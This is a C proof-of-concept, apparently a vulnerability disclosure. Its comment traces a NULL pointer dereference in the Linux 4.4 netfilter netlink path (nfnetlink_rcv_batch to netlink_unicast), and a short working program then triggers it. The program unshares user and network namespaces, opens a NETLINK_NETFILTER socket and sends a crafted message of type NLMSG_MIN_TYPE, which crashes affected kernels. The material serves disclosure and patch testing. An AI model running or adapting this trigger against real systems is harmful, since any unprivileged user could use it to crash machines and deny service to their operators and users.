/*
The following trigger will go through nfnetlink_rcv() with nlmsg_type set to
NLMSG_MIN_TYPE

static void nfnetlink_rcv(struct sk_buff *skb)
{
        struct nlmsghdr *nlh = nlmsg_hdr(skb);
        u_int16_t res_id;
        int msglen;

        ...

        if (nlh->nlmsg_type == NFNL_MSG_BATCH_BEGIN) {
                struct nfgenmsg *nfgenmsg;
		...
                nfnetlink_rcv_batch(skb, nlh, res_id);
        } else {
...
}

nfnetlink_rcv_batch() then calls netlink_skb_clone in [1] to clone the passed  skb. When cloning, the 'sk' member of the cloned skb struct is set to NULL.

static void nfnetlink_rcv_batch(struct sk_buff *skb, struct nlmsghdr *nlh,
                                u_int16_t subsys_id)
{
        struct sk_buff *oskb = skb;
        struct net *net = sock_net(skb->sk);
        const struct nfnetlink_subsystem *ss;
        const struct nfnl_callback *nc;
        static LIST_HEAD(err_list);
        u32 status;
        int err;

        if (subsys_id >= NFNL_SUBSYS_COUNT)
                return netlink_ack(skb, nlh, -EINVAL);
replay:
        status = 0;

        skb = netlink_skb_clone(oskb, GFP_KERNEL);         [1]
        if (!skb)
                return netlink_ack(oskb, nlh, -ENOMEM);

        ...

        if (!ss->commit || !ss->abort) {
                nfnl_unlock(subsys_id);
                netlink_ack(skb, nlh, -EOPNOTSUPP);        [2]
                return kfree_skb(skb);
        }
...

In [2] netlink_ack takes the cloned skb with sk <-- NULL and then passes is
to netlink_unicast:

int netlink_unicast(struct sock *ssk, struct sk_buff *skb,
                    u32 portid, int nonblock)
{
        struct sock *sk;
        int err;
        long timeo;

        skb = netlink_trim(skb, gfp_any());

        timeo = sock_sndtimeo(ssk, nonblock);
retry:
        sk = netlink_getsockbyportid(ssk, portid);         [3]
        if (IS_ERR(sk)) {
                kfree_skb(skb);
                return PTR_ERR(sk);
        }
        if (netlink_is_kernel(sk))
                return netlink_unicast_kernel(sk, skb, ssk);

        if (sk_filter(sk, skb)) {
                err = skb->len;
                kfree_skb(skb);
                sock_put(sk);
                return err;
        }

        err = netlink_attachskb(sk, skb, &timeo, ssk);
        if (err == 1)
                goto retry;
        if (err)
                return err;

        return netlink_sendskb(sk, skb);
}
EXPORT_SYMBOL(netlink_unicast);

In [3], ssk (<-- NULL) will be dereferenced by the netlink_getsockbyportid
function leading to null-ptr-deref.

Affects upstream 4.4 kernels including Ubuntu 4.4 LTS kernels. Haven't tried
to bisect this bug or check any other kernels.
*/
#define _GNU_SOURCE

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sched.h>

#include <sys/socket.h>
#include <linux/netlink.h>

int main(void) {
	if (unshare(CLONE_NEWUSER|CLONE_NEWNET) == -1) {
		perror("unshare");
		exit(-1);
	}
	struct iovec iov[1];
 	struct msghdr msg;

        memset(&msg,   0, sizeof(msg));
        memset(iov,    0, sizeof(iov));

	int buf[64];
	memset(buf, 0, 64);

	int s = socket(AF_NETLINK, SOCK_RAW, NETLINK_NETFILTER);

	iov[0].iov_base = buf;
	iov[0].iov_len = 0xa0;
	buf[0] = 0xa0; // len 
	buf[1] = NLMSG_MIN_TYPE; // type
        msg.msg_iov     = iov;
        msg.msg_iovlen  = 1;

	sendmsg(s, &msg, 0x40000);

	return 0;
}

